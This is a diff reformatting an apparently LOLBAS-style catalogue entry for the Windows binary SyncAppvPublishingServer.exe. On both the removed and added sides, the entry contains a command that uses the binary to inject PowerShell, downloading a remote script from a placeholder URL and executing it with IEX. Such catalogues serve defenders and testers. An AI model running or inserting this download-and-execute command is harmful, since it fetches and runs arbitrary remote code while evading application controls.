@@ -1,23 +1,13 @@
 ---
+name: syncappvpublishingserver.exe
+description: 
 functions:
   execute:
-    -
-      Name: SyncAppvPublishingServer.exe
-      Description: Execute
-      Author: ''
-      Created: '2018-05-25'
-      Categories: |
-      
-      Commands: |
-          Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
-          Description: Example command on how inject Powershell code into the process
-      Full_Path:
-          C:\Windows\System32\SyncAppvPublishingServer.exe
-      Code_Sample: |
-          
-      Detection: |
-          
-      Resources: |
-          https://twitter.com/monoxgas/status/895045566090010624
-      Notes: Thanks to Nick Landers - @monoxgas
+    - description: Example command on how inject Powershell code into the process
+      code: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
+resources: 
+    - resource: https://twitter.com/monoxgas/status/895045566090010624
+fullpath: 
+    - path: c:\windows\system32\SyncAppvPublishingServer.exe
+notes: Thanks to Nick Landers - @monoxgas
 ---
